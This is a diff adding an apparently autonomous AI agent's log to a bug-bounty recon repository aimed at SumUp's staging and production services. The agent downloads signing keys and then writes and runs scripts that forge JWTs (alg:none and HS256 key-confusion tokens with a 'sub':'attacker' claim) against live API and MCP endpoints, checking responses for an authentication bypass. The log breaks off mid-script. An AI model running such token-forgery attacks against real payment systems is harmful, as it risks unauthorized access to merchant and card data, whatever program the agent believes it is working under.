@@ -41934,3 +41934,670 @@ testability: PASSIVE
 
 ## STEP 7 — RISK
 - **[RISK]** sumup: 45. No exploitable finding this cycle, but it broke a 14-cycle zero-delta pattern with real yield: `gateway.sumup.com` (production PCI card-entry host) and `pos.sumup.com` (merchant back-office on third-party infra) were both missing from a 28-cycle inventory, and both message-handling/impersonation hypotheses were measured and refuted on evidence rather than assumed. Standing risk is unchanged and dominated by the submission/credential bottleneck — `auth.sam-app.ro` RFC 7591 dynamic registration (VALID 7.5, complete, self-contained) is unsubmitted for the 14th cycle, and the two highest-impact prod leads (apple-pay SSRF, `api.sumup.com` aud binding) both require a merchant bearer no agent cycle can obtain. Note for accuracy: `reports/valid-bugs.md` verified on disk at 79 lines this cycle; `reports/contentful-preview-token-leak.md` verified still absent (archival close holds — no further claims about it).
+===== ANALYST bigpickle 2026-09-25 23:39:14 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la; echo "---REPORTS---"; ls -la reports/ 2>/dev/null | head -40
+total 700
+drwxr-xr-x 12 runner runner   4096 Sep 25 23:32 .
+drwxr-xr-x  3 runner runner   4096 Sep 25 23:32 ..
+drwxr-xr-x  7 runner runner   4096 Sep 25 23:32 .git
+drwxr-xr-x  3 runner runner   4096 Sep 25 23:32 .github
+-rw-r--r--  1 runner runner   1885 Sep 25 23:32 README.md
+-rw-r--r--  1 runner runner     32 Sep 25 23:32 analyst-out.txt
+-rw-r--r--  1 runner runner 278843 Sep 25 23:32 analyst-prompt.txt
+-rw-r--r--  1 runner runner 274957 Sep 25 23:32 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 leads
+-rw-r--r--  1 runner runner  60566 Sep 25 23:32 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 reports
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 reposcan-raw
+-rw-r--r--  1 runner runner   3299 Sep 25 23:32 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 25 23:32 scripts
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 25 23:32 state_nemotron3.json
+drwxr-xr-x  2 runner runner  12288 Sep 25 23:32 triage
+---REPORTS---
+total 5880
+drwxr-xr-x  2 runner runner    4096 Sep 25 23:32 .
+drwxr-xr-x 12 runner runner    4096 Sep 25 23:32 ..
+-rw-r--r--  1 runner runner 3257400 Sep 25 23:32 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   31465 Sep 25 23:32 analyst-laguna.log
+-rw-r--r--  1 runner runner   31320 Sep 25 23:32 analyst-ling3.log
+-rw-r--r--  1 runner runner   31610 Sep 25 23:32 analyst-longcat.log
+-rw-r--r--  1 runner runner 2178637 Sep 25 23:32 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    2138 Sep 25 23:32 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Sep 25 23:32 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Sep 25 23:32 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Sep 25 23:32 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   10621 Sep 25 23:32 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  424682 Sep 25 23:32 hypotheses.md
+-rw-r--r--  1 runner runner    9173 Sep 25 23:32 reposcan-findings.md
+-rw-r--r--  1 runner runner    7384 Sep 25 23:32 valid-bugs.md
+[0m
+[0m$ [0mmkdir -p /tmp/opencode/sumup && cd /tmp/opencode/sumup && curl -s -m 25 "https://auth.sam-app.ro/.well-known/jwks.json" -o stg_jwks.json -w "staging_http=%{http_code}\n" && curl -s -m 25 "https://auth.sumup.com/.well-known/jwks.json" -o prod_jwks.json -w "prod_http=%{http_code}\n"; ls -la
+staging_http=200
+prod_http=200
+total 40
+drwxr-xr-x 2 runner runner  4096 Sep 25 23:33 .
+drwxr-xr-x 3 runner runner  4096 Sep 25 23:33 ..
+-rw-r--r-- 1 runner runner 15316 Sep 25 23:33 prod_jwks.json
+-rw-r--r-- 1 runner runner 14353 Sep 25 23:33 stg_jwks.json
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, hashlib, collections
+def load(p): return json.load(open(p))
+for name,p in (("STAGING","stg_jwks.json"),("PROD","prod_jwks.json")):
+    d=load(p)
+    keys=d.get("keys",[])
+    print(f"=== {name} ({p}) keys={len(keys)} ===")
+    mods=collections.defaultdict(list)
+    for k in keys:
+        kid=k.get("kid"); kty=k.get("kty"); alg=k.get("alg"); use=k.get("use")
+        bits=None
+        if kty=="RSA" and k.get("n"):
+            n=base64url_to_int(k["n"]) if False else None
+        info=""
+        if kty=="RSA" and k.get("n"):
+            import base64
+            n=base64.urlsafe_b64decode(k["n"]+"="*(-len(k["n"])%4))
+            bits=n.bit_length()
+            mods[k["n"]].append(kid)
+            import hashlib as h
+            info=f"bits={bits} n_sha256={h.sha256(k['n'].encode()).hexdigest()[:16]}"
+        elif kty=="OKP" or kty=="EC":
+            x=k.get("x","")
+            import base64
+            try:
+                xb=base64.urlsafe_b64decode(x+"="*(-len(x)%4)); info=f"crv={k.get('crv')} xlen={len(xb)*8}"
+            except Exception as e: info=str(e)
+            mods[x].append(kid)
+        print(f"  kid={kid!r:28} kty={kty:4} alg={alg!r:8} use={use!r:10} {info}")
+    dupes={k:v for k,v in mods.items() if len(v)>1}
+    print(f"  duplicate-key-material groups: {len(dupes)}")
+    for k,v in dupes.items(): print("   DUP",v)
+PY
+=== STAGING (stg_jwks.json) keys=11 ===
+Traceback (most recent call last):
+  File "<stdin>", line 17, in <module>
+AttributeError: 'bytes' object has no attribute 'bit_length'
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, hashlib, collections
+def b64d(s): return base64.urlsafe_b64decode(s + "="*(-len(s)%4))
+for name,p in (("STAGING","stg_jwks.json"),("PROD","prod_jwks.json")):
+    d=json.load(open(p)); keys=d.get("keys",[])
+    print(f"=== {name} ({p}) total_keys={len(keys)} ===")
+    mods=collections.defaultdict(list)
+    for k in keys:
+        kid=k.get("kid"); kty=k.get("kty"); info=""
+        if kty=="RSA" and k.get("n"):
+            n=int.from_bytes(b64d(k["n"]),'big')
+            info=f"bits={n.bit_length()} nhash={hashlib.sha256(k['n'].encode()).hexdigest()[:12]}"
+            mods[k["n"]].append(kid)
+        elif k.get("x"):
+            xb=b64d(k["x"]); info=f"crv={k.get('crv')} xbits={len(xb)*8} xhash={hashlib.sha256(k['x'].encode()).hexdigest()[:12]}"
+            mods[k["x"]].append(kid)
+        print(f"  kid={str(kid):26} kty={str(kty):4} alg={str(k.get('alg')):8} use={str(k.get('use')):8} {info}")
+    dup={kk:v for kk,v in mods.items() if len(v)>1}
+    print(f"  duplicate key-material groups: {len(dup)}", dup if dup else "")
+PY
+=== STAGING (stg_jwks.json) total_keys=11 ===
+  kid=2ca76842-2487-428f-a87f-603d1f6f6ef0 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=7219df434411
+  kid=ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg kty=OKP  alg=EdDSA    use=sig      crv=Ed25519 xbits=256 xhash=dff276624973
+  kid=public:73c59380-fbab-4a2f-8d0e-1884cf8ec724 kty=RSA  alg=RS256    use=sig      bits=4096 nhash=58816bba587a
+  kid=public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097 kty=RSA  alg=RS256    use=sig      bits=4096 nhash=012eaf566982
+  kid=public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a kty=RSA  alg=RS256    use=sig      bits=4096 nhash=82095ae98350
+  kid=public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=1e032c6e1c94
+  kid=public:3862035e-6139-422f-b17d-cf67b950a74f kty=RSA  alg=RS256    use=sig      bits=4096 nhash=846061ba9356
+  kid=public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=d636e2c41552
+  kid=public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a kty=RSA  alg=RS256    use=sig      bits=4096 nhash=82095ae98350
+  kid=public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=1e032c6e1c94
+  kid=loadtesting                kty=RSA  alg=RS256    use=sig      bits=2048 nhash=d983651f70bb
+  duplicate key-material groups: 2 {'0J_XUWzO6tK0sHZXlKL3-YMXo2s0StzAkIKkPb6I5UENPDGUOVLa2gsLapLyaD3-qWP2CLFelscBzksrxFh1IvCyIrd1HKz72Ao9p3ZWCTWSDIq23azemO1L6R4ha8KNKyFF1Ii2vGW3JJSGYbcuQsMqutbi8g4dAZje4pf9DFn8IRjTx6kFXrGZ4TnbopgX0NGVdlC7O6AxH-G2TF4gVUrjWo6XnsP2VpkROWzvgWiDXzvy3UNrPpde8l-fR8k-2PRAaIBoQDCHRF9GlK10iJ7KfalFTv8AQtZOWmO4IhAnXhkmWG2TGYTeYCWpYmefmiZd_RbdH8_CR53tjsK301in8SjHArRxFXIxRdfLtqb1v6zCETBdKS5WY_AFLrf-GmP6VV0botf6zsiGNihHU1dmdfget_DjqJpeq07BzXw9h_TNBKSCP1rVkDpSAF2LxSA5lpi8RN0MFtvuIfj4jEeqQoQV9MbAzFyrDmAJ_bsBbNECnCvaDZwBfaSJ3NnQ7QjXBQrgdqSrREJ13UtNs-q42IuvFonTbZ80a9q0m5GKhIJ8ZZqQMjMU7DyLMGzhtAjaonqTKR6igyQ5PTsZ7AlpZNB6eTr3yeHUaxSJQOb5lPa5PF-VLx9-05Nhr1Gkl8ttUnbrRKuyzjzt2JZ1py_9pv0MFZu6vjTbM9Ki2l0': ['public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a', 'public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a'], 'uuzFzA4Jb2N9EFOUxGTP7d9AU9TNE0ZurJPz5zctsKWfr5MBG5mgYYYiSD2Nh2VzmepBa9u6Oi-KbpP-qMDoDNxDlJ35Vt4yFx-_9eyKJNZguFL2Wrl1cRONJ1nID-Klrv6sush43V9zazLpWXq4KKy7fBGUUMxog4dh1N4mWtnmu6oezMoIol0EW0nIkvq7pKOniuBVaNSUUW4UVg-qOiTIym1E8Z-jf8CDjoJoAtfPF5jYNBWQB2xY1EzVC8Whn54zjQPzTDdN558wp8eCf-KcfUg173k7AeNivHop2V3GeC4sG8IMAAPr6m2dxJDJ6uPTgRZuYRlTWr_kYlR-KQ': ['public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9', 'public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9']}
+=== PROD (prod_jwks.json) total_keys=8 ===
+  kid=public:38618372-f016-4e5d-97b2-d043a975d243 kty=RSA  alg=RS256    use=sig      bits=4096 nhash=fc8fca7dcac7
+  kid=public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=cdc779b5168a
+  kid=public:8c332d17-2b35-4cba-a61e-6843b4375a71 kty=RSA  alg=RS256    use=sig      bits=4096 nhash=d2cbba8ee56f
+  kid=public:a4627362-0900-4bfa-8b68-3a740165dbcf kty=RSA  alg=RS256    use=sig      bits=4096 nhash=330d8a06d5b2
+  kid=public:32ad4b15-8641-4aaa-9a2e-427bb1848321 kty=RSA  alg=RS256    use=sig      bits=2048 nhash=4338461fe8a8
+  kid=public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3 kty=RSA  alg=RS256    use=sig      bits=4096 nhash=2152f669cd5c
+  kid=1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM kty=RSA  alg=RS256    use=None     bits=2048 nhash=972494d74424
+  kid=-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4 kty=OKP  alg=EdDSA    use=None     crv=Ed25519 xbits=256 xhash=7f613aee700d
+  duplicate key-material groups: 0
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && for h in chat.sumup.com me.sumup.com help.sumup.com checkout.sumup.com gateway.sumup.com pay.sumup.com; do printf "%-22s " "$h"; curl -s -m 15 -o r9728.txt -w "http=%{http_code} len=%{size_download} " "https://$h/.well-known/oauth-protected-resource"; head -c 400 r9728.txt | tr -d '\n'; echo; sleep 1; done
+chat.sumup.com         http=404 len=9506 <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/ae1c5ddf034a581c.css?dpl=dpl_EVKif1GR1v8rQbNyBR6AHBW33Fa9" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/013b1c7dc57ba1e5.css?dpl=dpl_EVKif1GR1v8rQbNyBR6AHBW33Fa9" data-precedence="next"/><link rel="
+me.sumup.com           http=404 len=2155 <!DOCTYPE html><html><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><link rel="preload" href="/_next/static/chunks/0uqaxihal0x-2.css" as="style"/><link rel="preload" href="/_next/static/chunks/2tp7i_-9rsez0.css" as="style"/><link rel="preload" href="/_next/static/chunks/3wrga7uwv71mg.css" as="style"/><link rel="stylesheet" href=
+help.sumup.com         http=404 len=34747 <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><title data-next-head="">Page not found</title><link rel="preload" href="https://static.sumup.com/fonts/Inter/Inter-normal-latin.woff2" as="font" type="font/woff2" crossorigin=""/><link rel="apple-touch-icon" sizes="180x180" href="https://static.sumup.
+checkout.sumup.com     http=403 len=59 ForbiddenForbiddenpdx1::tmvjv-1790379220525-c26c7e87d0ee
+gateway.sumup.com      http=404 len=79 The page could not be foundNOT_FOUNDpdx1::npz89-1790379221662-e6d411fb9c39
+pay.sumup.com          http=403 len=59 ForbiddenForbiddenpdx1::4kn8k-1790379222778-a0246a17c45d
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && for p in "/v0.1/merchants/MH4H92C7/payment-methods" "/v0.1/me" "/.well-known/oauth-protected-resource" "/me" "/v0.1/transactions"; do printf "%-46s " "$p"; curl -s -m 15 -o body.txt -w "http=%{http_code} ct=%{content_type} len=%{size_download}\n" "https://api.sam-app.ro$p"; head -c 300 body.txt; echo; echo "---"; sleep 1; done
+/v0.1/merchants/MH4H92C7/payment-methods       http=200 ct=application/json len=46
+{"available_payment_methods":[{"id":"card"}]}
+
+---
+/v0.1/me                                       http=404 ct=application/json len=150
+{
+	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",
+	"title": "Not Found",
+	"status": 404,
+	"detail": "Resource not found"
+}
+
+---
+/.well-known/oauth-protected-resource          http=200 ct=application/json len=310
+{
+	"resource_name": "SumUp API (stage)",
+	"resource": "https://api.sam-app.ro",
+	"authorization_servers": ["https://auth.sam-app.ro"],
+	"bearer_methods_supported": ["header"],
+	"jwks_uri": "https://auth.sam-app.ro/.well-known/jwks.json",
+	"resource_documentation": "https://developer-stage.sumup-verc
+---
+/me                                            http=404 ct=application/json len=150
+{
+	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",
+	"title": "Not Found",
+	"status": 404,
+	"detail": "Resource not found"
+}
+
+---
+/v0.1/transactions                             http=404 ct=application/json len=150
+{
+	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",
+	"title": "Not Found",
+	"status": 404,
+	"detail": "Resource not found"
+}
+
+---
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, hmac, hashlib, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+def b64d(s): return base64.urlsafe_b64decode(s + "="*(-len(s)%4))
+jwks=json.load(open("stg_jwks.json"))["keys"]
+k=next(x for x in jwks if x.get("kid")=="loadtesting")
+pub=b64d(k["n"]); print("loadtesting kid modulus bytes:",len(pub))
+
+def hdr(a): return b64u(json.dumps({"alg":a,"typ":"JWT"}).encode())
+claims={"iss":"https://auth.sam-app.ro","sub":"attacker","aud":"https://api.sam-app.ro","exp":4102444800,"scp":["readers"],"iat":1789000000}
+pl=b64u(json.dumps(claims).encode())
+
+# alg:none
+t_none=f"{hdr('none')}.{pl}."
+# HS256 confusion using raw RSA public key PEM bytes as HMAC secret
+pem=("-----BEGIN PUBLIC KEY-----\n"+"\n".join(base64.b64encode(pub[i:i+64]).decode() for i in range(0,len(pub),64))+"\n-----END PUBLIC KEY-----").encode()
+sig=hmac.new(pem,f"{hdr('HS256')}.{pl}".encode(),hashlib.sha256).digest()
+t_hs=f"{hdr('HS256')}.{pl}.{b64u(sig)}"
+# HS256 with kid=loadtesting, secret = b64 of n
+t_hs2=f"{hdr('HS256')}.{pl}.{b64u(hmac.new(k['n'].encode(),f'{hdr(chr(72)+chr(83)+chr(50)+chr(53)+chr(54))}.{pl}'.encode(),hashlib.sha256).digest())}"
+
+paths=["/v0.1/merchants/MH4H92C7/transactions?limit=1","/v0.1/transactions","/v0.1/merchants/MH4H92C7/payment-methods"]
+states=[("noauth",None),("malformed","Bearer not.a.token"),("alg_none",f"Bearer {t_none}"),("hs256_pubkeypem",f"Bearer {t_hs}"),("hs256_modn",f"Bearer {t_hs2}")]
+out={}
+for p in paths:
+    print(f"\n### {p}")
+    for name,tok in states:
+        cmd=["curl","-s","-m","15","-o","/tmp/opencode/sumup/b.txt","-w","%{http_code}|%{content_type}|%{size_download}","https://api.sam-app.ro"+p]
+        if tok: cmd[1:1]=["-H",f"Authorization: {tok}"]
+        r=subprocess.run(cmd,capture_output=True,text=True).stdout
+        body=open("/tmp/opencode/sumup/b.txt").read()[:120].replace("\n","")
+        out[(p,name)]=r
+        print(f"  {name:16} {r:28} {body}")
+        time.sleep(1)
+print("\n=== DISTINCT RESPONSES PER PATH ===")
+for p in paths:
+    s={out[(p,n)] for n,_ in states}
+    print(f"  {p}: {'DISCRIMINATES' if len(s)>1 else 'no discriminator ('+str(len(s))+' distinct) '}")
+PY
+loadtesting kid modulus bytes: 256
+
+### /v0.1/merchants/MH4H92C7/transactions?limit=1
+  noauth           404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  malformed        404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  alg_none         404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  hs256_pubkeypem  404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  hs256_modn       404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+
+### /v0.1/transactions
+  noauth           404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  malformed        404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  alg_none         404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  hs256_pubkeypem  404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+  hs256_modn       404|application/json|150     {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status": 404,	"de
+
+### /v0.1/merchants/MH4H92C7/payment-methods
+  noauth           200|application/json|46      {"available_payment_methods":[{"id":"card"}]}
+  malformed        200|application/json|46      {"available_payment_methods":[{"id":"card"}]}
+  alg_none         200|application/json|46      {"available_payment_methods":[{"id":"card"}]}
+  hs256_pubkeypem  200|application/json|46      {"available_payment_methods":[{"id":"card"}]}
+  hs256_modn       200|application/json|46      {"available_payment_methods":[{"id":"card"}]}
+
+=== DISTINCT RESPONSES PER PATH ===
+  /v0.1/merchants/MH4H92C7/transactions?limit=1: no discriminator (1 distinct) 
+  /v0.1/transactions: no discriminator (1 distinct) 
+  /v0.1/merchants/MH4H92C7/payment-methods: no discriminator (1 distinct)
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && echo "=== mcp.sam-app.ro baseline (no auth) ===" && curl -s -m 20 -D h.txt -o b.txt -w "http=%{http_code} ct=%{content_type}\n" "https://mcp.sam-app.ro/mcp"; grep -iE "^(www-authenticate|x-envoy|server|cf-|content-type)" h.txt; head -c 200 b.txt; echo; echo "=== headers of interest ==="; grep -iE "www-authenticate|realm|bearer" h.txt
+=== mcp.sam-app.ro baseline (no auth) ===
+http=401 ct=application/json
+content-type: application/json
+www-authenticate: Bearer realm="mcp", scope="offline_access email", resource_metadata="https://mcp.sam-app.ro/.well-known/oauth-protected-resource/mcp"
+server: cloudflare
+cf-ray: a40dd704d9310d8d-SEA
+{"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+=== headers of interest ===
+www-authenticate: Bearer realm="mcp", scope="offline_access email", resource_metadata="https://mcp.sam-app.ro/.well-known/oauth-protected-resource/mcp"
+access-control-expose-headers: WWW-Authenticate,mcp-session-id
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && for p in "/zzzz" "/" "/v0.1/merchants/MH4H92C7/accounts" "/v0.1/payouts" "/v0.2/checkouts/00000000-0000-0000-0000-000000000000"; do printf "%-58s " "$p"; curl -s -m 15 -o b.txt -w "http=%{http_code} len=%{size_download} " "https://api.sam-app.ro$p"; head -c 110 b.txt | tr -d '\n'; echo; sleep 1; done
+/zzzz                                                      http=404 len=150 {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status":
+/                                                          http=404 len=150 {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status":
+/v0.1/merchants/MH4H92C7/accounts                          http=404 len=150 {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status":
+/v0.1/payouts                                              http=404 len=150 {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status":
+/v0.2/checkouts/00000000-0000-0000-0000-000000000000       http=404 len=150 {	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",	"title": "Not Found",	"status":
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && echo "=== RFC9728 per-resource metadata (NEW URL from WWW-Authenticate) ===" && curl -s -m 20 -D h2.txt -o m.json -w "http=%{http_code} ct=%{content_type}\n" "https://mcp.sam-app.ro/.well-known/oauth-protected-resource/mcp"; cat m.json; echo; echo "--- also try mcp path variants ---"; for u in "/.well-known/oauth-protected-resource/mcp" "/.well-known/oauth-protected-resource" "/.well-known/openid-configuration"; do printf "%-46s " "$u"; curl -s -m 15 -o /dev/null -w "http=%{http_code} len=%{size_download}\n" "https://mcp.sam-app.ro$u"; sleep 1; done
+=== RFC9728 per-resource metadata (NEW URL from WWW-Authenticate) ===
+http=200 ct=application/json
+{"resource":"https://mcp.sam-app.ro/mcp","authorization_servers":["https://auth.sam-app.ro/"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+--- also try mcp path variants ---
+/.well-known/oauth-protected-resource/mcp      http=200 len=272
+/.well-known/oauth-protected-resource          http=200 len=272
+/.well-known/openid-configuration              http=404 len=73
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, hmac, hashlib, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+def b64d(s): return base64.urlsafe_b64decode(s + "="*(-len(s)%4))
+def pem_of(nb):
+    return ("-----BEGIN PUBLIC KEY-----\n"+"\n".join(base64.b64encode(nb[i:i+64]).decode() for i in range(0,len(nb),64))+"\n-----END PUBLIC KEY-----\n").encode()
+stg=json.load(open("stg_jwks.json"))["keys"]; prd=json.load(open("prod_jwks.json"))["keys"]
+lt=next(k for k in stg if k.get("kid")=="loadtesting")
+pr=next(k for k in stg if k.get("kid")=="2ca76842-2487-428f-a87f-603d1f6f6ef0")
+prr=next(k for k in prd if k.get("kty")=="RSA")
+ed=next(k for k in stg if k.get("kty")=="OKP")
+
+C={"iss":"https://auth.sam-app.ro/","sub":"probe-attacker","aud":"https://mcp.sam-app.ro/mcp",
+   "exp":4102444800,"iat":1789000000,"scp":["offline_access","email"],"scope":"offline_access email"}
+pl=b64u(json.dumps(C).encode())
+def H(a,kid=None):
+    o={"alg":a,"typ":"JWT"}
+    if kid: o["kid"]=kid
+    return b64u(json.dumps(o).encode())
+def hs(alg,kid,secret,pfx):
+    s=b64u(hmac.new(secret,f"{H(alg,kid)}.{pfx}".encode(),hashlib.sha256).digest())
+    return f"{H(alg,kid)}.{pfx}.{s}"
+
+T=[("01_control_garbage","Bearer x.y.z"),
+   ("02_alg_none",              f"Bearer {H('none')}.{pl}."),
+   ("03_alg_None_upper",        f"Bearer {H('None')}.{pl}."),
+   ("04_hs256_confuse_stgPEM_kidloadtesting", hs("HS256","loadtesting",pem_of(b64d(lt['n'])),pl)),
+   ("05_hs256_confuse_stgPEM_nokid",          hs("HS256",None,pem_of(b64d(lt['n'])),pl)),
+   ("06_hs256_secret_rawmodulus_kidloadtesting", hs("HS256","loadtesting",b64d(lt['n']),pl)),
+   ("07_hs256_secret_b64n_kidloadtesting",    hs("HS256","loadtesting",lt['n'].encode(),pl)),
+   ("08_hs256_confuse_PROD_PEM",              hs("HS256","loadtesting",pem_of(b64d(prr['n'])),pl)),
+   ("09_hs256_secret_ed25519_x",              hs("HS256",ed.get("kid"),b64d(ed['x']),pl)),
+   ("10_hs256_confuse_kid_uuid_2ca76842",     hs("HS256","2ca76842-2487-428f-a87f-603d1f6f6ef0",pem_of(b64d(pr['n'])),pl)),
+]
+res={}
+for name,tok in T:
+    r=subprocess.run(["curl","-s","-m","20","-D","hh.txt","-o","bb.txt","-w","%{http_code}|%{size_download}",
+        "-H",f"Authorization: {tok}","-H","Accept: application/json, text/event-stream",
+        "https://mcp.sam-app.ro/mcp"],capture_output=True,text=True).stdout
+    body=open("bb.txt").read()[:150].replace("\n"," ")
+    res[name]=(r,body)
+    flag=" <<<<< DIFFERENT" if not body.startswith('{"jsonrpc":"2.0","error":{"code":-32010') else ""
+    print(f"{name:44} {r:14} {body}{flag}")
+    time.sleep(1)
+print("\nbaseline control for comparison:")
+r=subprocess.run(["curl","-s","-m","20","-o","bb.txt","-w","%{http_code}|%{size_download}","https://mcp.sam-app.ro/mcp"],capture_output=True,text=True).stdout
+print("  no-auth baseline:",r,open("bb.txt").read()[:150].replace("\n"," "))
+PY
+01_control_garbage                           401|84         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Invalid access token"},"id":null}
+02_alg_none                                  401|84         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Invalid access token"},"id":null}
+03_alg_None_upper                            401|84         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Invalid access token"},"id":null}
+04_hs256_confuse_stgPEM_kidloadtesting       401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+05_hs256_confuse_stgPEM_nokid                401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+06_hs256_secret_rawmodulus_kidloadtesting    401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+07_hs256_secret_b64n_kidloadtesting          401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+08_hs256_confuse_PROD_PEM                    401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+09_hs256_secret_ed25519_x                    401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+10_hs256_confuse_kid_uuid_2ca76842           401|87         {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+
+baseline control for comparison:
+  no-auth baseline: 401|87 {"jsonrpc":"2.0","error":{"code":-32010,"message":"Authentication required"},"id":null}
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, os, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+stg=json.load(open("stg_jwks.json"))["keys"]; prd=json.load(open("prod_jwks.json"))["keys"]
+stg_kids=[k["kid"] for k in stg]; prd_kids=[k["kid"] for k in prd]
+print("staging kids:",stg_kids); print("prod kids   :",prd_kids)
+C={"iss":"https://auth.sam-app.ro/","sub":"probe","aud":"https://mcp.sam-app.ro/mcp","exp":4102444800,
+   "iat":1789000000,"scp":["offline_access","email"],"scope":"offline_access email"}
+pl=b64u(json.dumps(C).encode())
+def H(alg,kid):
+    o={"alg":alg,"typ":"JWT"}
+    if kid: o["kid"]=kid
+    return b64u(json.dumps(o).encode())
+def tok(alg,kid):
+    sig=b64u(os.urandom(32))
+    return f"Bearer {H(alg,kid)}.{pl}.{sig}"
